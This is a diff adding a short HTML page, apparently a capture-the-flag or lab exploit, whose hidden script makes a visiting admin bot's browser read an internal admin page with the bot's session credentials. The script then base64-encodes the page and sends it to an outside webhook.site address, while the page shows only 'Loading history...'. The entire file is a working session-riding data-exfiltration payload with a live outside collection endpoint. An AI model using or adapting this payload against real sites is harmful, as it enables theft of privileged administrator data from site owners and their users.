@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // On demande au navigateur du bot de lire la page admin
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://192.168.132.208:9223/admin", true);
+        xhr.withCredentials = true; // Pour utiliser sa session admin
+        
+        xhr.onload = function() {
+            // On envoie le contenu récolté vers ton webhook
+            var report = btoa(unescape(encodeURIComponent(xhr.responseText)));
+            new Image().src = "https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010?exfil=" + report.substring(0, 1500);
+        };
+        xhr.send();
+    </script>
+    <p>Loading history...</p>
+</body>
+</html>
